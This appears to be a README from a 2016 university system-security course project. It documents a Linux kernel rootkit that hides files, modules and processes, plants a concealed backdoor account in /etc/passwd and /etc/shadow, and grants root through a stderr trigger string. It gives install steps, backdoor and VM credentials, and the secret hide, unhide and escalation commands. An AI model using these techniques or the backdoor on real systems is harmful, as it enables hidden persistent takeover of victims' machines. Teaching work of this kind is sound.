/**********************************************************************************
 
 *	Last Updated: Nov 27, 2016
 *	CSE509 System Security Fall 2016
 *	Written By:
 
 		Edwin Yan (edyan@cs.stonybrook.edu)
 		Rashmi Makheja (rmakheja@cs.stonybrook.edu)
 		Sagar Shah (schshah@cs.stonybrook.edu)
 		Vasia Patov (vpatov@cs.stonybrook.edu) 
 *	Project: Rootkit
 
 **********************************************************************************/
 
 System Specification:
	
		This project is built and tested on ubuntu 12.04 having kernel version 3.2.0-115-generic-pae
		
VM ova: https://goo.gl/zjEnPb
Username : iambate
Password : rootkit1337

Backdoor account:
username : rtry
password : rashmi

Steps to install rootkit:

	1) build the kernel, install modules and reboot the system
	2) cd /home/iambate/sys_sec/1337rootkit
		go to the rootkit folder(assuming the rootkit source is in this folder)
	3) sudo make 
		build the module
	4) sudo insmod 1337Rootkit.ko 
		installs the rootkit module


Illustrations of the basic requirements:

	1) Hide specific files and directories from showing up when a user does "ls" and similar commands
		i)ls
		ii)lsmod
			 rootkit module and files that have '1337' in their name will be hidden

	2) Modify the /etc/passwd and /etc/shadow file to add a backdoor account while returning the original contents of the 		files (pre-attack) when a normal user requests to see the file
		i) sudo cat /etc/passwd
		ii) sudo cat /etc/shadow
			The above two files should not show content related to user 'rtry'(the backdoor account)
		iii) sudo useradd testrootkit509
			Whenever any a new user is added, a malicious user 'rtry' is added if not already present. If already 				present, it will retained.
		iv) sudo passwd testrootkit509
			Whenever a user changes password, the malicious user and its details will remain intact even when 				though rootkit hides the malicious user when opening password. shadow file.
		v) login
			login using rtry username and password and you get successfully loggedin

	3) Hides processes from the process table when a user does a "ps"
		i) ps
			The process of rootkit will be hidden from the result of ps command. e.g. all process containing "1337" 			will be hidden.
	4) Give the ability to a malicious process to elevate its uid to 0 (root) upon demand
		i)setuid
			setuid syscall should be called with parameter INT_MAX, its privileges will be elevated to root.
		ii) python -c 'import os; os.write(2, "1337root"); os.system("/bin/sh");'
			process that will write "1337root" to stderr will get root privileges
Steps To remove rootkit:
	
	i) python -c 'import os; os.write(2, "1337show")'
	ii) sudo rmmod -f 1337rootkit.ko

Additional considerations:

	1) No difference in response time of any operation
	2) Selective hijacking for read so that attacker can log in using the backdoor account
	3) Attacker can login through SSH using the backdoor account
	3) Secret methods to hide/unhide rootkit:
		i) echo "The secret way to unhide rootkit is as follows:"
		   python -c 'import os; os.write(2, "1337show")'
		   echo "The rootkit appears"
		   lsmod |grep rootkit
		ii) echo "The secret way to hide it again"
		    python -c 'import os; os.write(2, "1337hide")'
		    lsmod |grep rootkit
		iii) echo "Some normal non-root user"
		     id
		iv) python -c 'import os; os.system("/bin/bash")'
		    id
		v) echo "One secret to get elevate root privileges is as follow:"
		   python -c 'import os; os.write(2, "1337root"); os.system("/bin/bash")'
		   id
		   echo "Congratulations You are root"
		   exit
		vi) echo "Lets try to uninstall the module"
		    sudo rmmod -f 1337rootkit.ko
		vii) echo "User cannot uninstall unless he knows the secret"
		     python -c 'import os; os.write(2, "1337show")'
		     sudo rmmod -f 1337rootkit.ko

Assumptions:

	1) passwd file assumed to be at max 4kb
	2) rootkit is assumed to be present on the victim's system
